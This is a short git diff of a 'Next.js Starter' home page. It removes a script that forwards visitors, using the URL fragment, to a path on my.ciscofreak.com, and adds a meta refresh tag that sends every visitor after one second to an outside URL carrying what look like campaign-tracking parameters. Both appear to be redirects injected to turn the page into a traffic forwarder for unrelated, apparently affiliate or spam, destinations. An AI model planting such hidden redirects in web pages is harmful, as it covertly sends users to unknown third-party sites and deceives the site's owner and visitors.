@@ -6,16 +6,7 @@ export default function Home() {
   return (
     <div className="container">
       <Head>
-    
-    <script>
-var tracking_param = window.location.href.split('#')[1];
-var srv_ip = "my.ciscofreak.com";
-if(!tracking_param){
-  alert("please set tracking params!")
-}else{
-  document.location.href = 'http://'+srv_ip+'/rdcl/'+tracking_param
-}
-</script>
+         <meta HTTP-EQUIV='REFRESH' content='1; url=https://www.thenameiva.com/75HHNCK/9H9MTBB/?creative_id=11030'/>
         <title>Next.js Starter!</title>
         <link rel="icon" href="/favicon.ico" />
       </Head>
